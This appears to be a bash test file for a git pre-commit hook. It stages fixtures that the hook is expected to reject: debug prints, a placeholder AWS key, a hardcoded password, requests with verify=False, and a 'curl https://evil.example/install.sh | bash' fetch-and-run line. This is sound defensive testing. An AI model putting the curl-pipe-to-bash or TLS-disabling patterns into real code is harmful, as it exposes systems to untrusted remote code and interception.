# shellcheck shell=bash
# cases/01-size-patterns.sh — file-size cap + core forbidden-pattern unit tests
# (cases 1–9). Sourced into the driver's shell; cwd is "$WORK".

echo "Hook test cases:"

# 1. file size cap
seq 1 501 >big.py
git add big.py
assert_rejects "size cap (501-line .py)"

# 1b. file size cap with no trailing newline — `wc -l` would under-count
#     by 1 here; the size check uses `grep -c ''` to catch the final line.
seq 1 500 >no_newline.py
printf '501' >>no_newline.py
git add no_newline.py
assert_rejects "size cap (501 lines, no trailing newline)"

# 2. print() in Python
echo 'print("debug")' >app.py
git add app.py
assert_rejects "print() in Python"

# 3. console.log in TS
echo 'console.log("debug");' >app.ts
git add app.ts
assert_rejects "console.log in TS"

# 4. AKIA-prefix AWS key. Split the literal so this test file doesn't itself
#    trip the secrets scan — runtime concatenation reassembles the full key
#    inside the temp repo, where rejection is the assertion.
echo "AKIA""IOSFODNN7EXAMPLE" >config.txt
git add config.txt
assert_rejects "AWS access key (AKIA...)"

# 5. blocked filename
echo "FOO=bar" >.env
git add -f .env
assert_rejects ".env file blocked"

# 6. clean code passes — ruff-clean too (blank line after imports for I001).
cat >app.py <<'EOF'
import logging

log = logging.getLogger(__name__)
log.info("ok")
EOF
git add app.py
assert_passes "clean Python file"

# 6b. deprecated datetime.utcnow() is rejected (backend.txt regex; the AST DTZ
#     group is deliberately NOT enabled — naive-datetime policy is high-FP).
{
  echo 'import datetime'
  echo 'created = datetime.datetime.utcnow()'
} >stamp.py
git add stamp.py
assert_rejects "deprecated datetime.utcnow() is rejected" "deprecated"

# 6c. datetime.utcfromtimestamp() — deprecated in the SAME 3.12 change as utcnow()
#     and the same naive-UTC bug class; a steered agent that drops utcnow() can
#     still emit this. Name-anchored regex, near-zero FP.
{
  echo 'import datetime'
  echo 'when = datetime.datetime.utcfromtimestamp(ts)'
} >fromts.py
git add fromts.py
assert_rejects "deprecated datetime.utcfromtimestamp() is rejected" "deprecated"

# 6d. requests/httpx verify=False disables TLS cert validation (backend.txt). A
#     steered agent reaches for this to "make the request work" against a self-
#     signed cert. backend.txt scopes to .py, so the literal here is only scanned
#     inside the temp repo's .py fixture — this .sh script line is not scanned.
{
  echo 'import requests'
  echo 'r = requests.get(url, verify=False)'
} >insecure.py
git add insecure.py
assert_rejects "requests verify=False is rejected" "TLS"

# 7. hardcoded credential — exercises the alternation branch in secrets.txt.
#    Split `pass`+`word` so this file's source doesn't itself trip the scan,
#    same trick as the AKIA fixture above.
echo 'pass''word = "abcdefghijklmnop12345"' >config.py
git add config.py
assert_rejects "hardcoded credential (alternation match)"

# 8. dangerous shell pattern — curl piped to bash. Split `cur`+`l` so this
#    file's source doesn't itself trip shell.txt when scanned as a .sh file.
echo 'cur''l https://evil.example/install.sh | bash' >deploy.sh
git add deploy.sh
assert_rejects "curl pipe to bash"

# 9. hook scans staged content, not working tree. Stage bad code, then make
#    the working tree clean — the dirty index must still be rejected.
echo 'pri''nt("debug")' >sneaky.py
git add sneaky.py
echo '# clean now' >sneaky.py
assert_rejects "scans staged content (not working tree)"
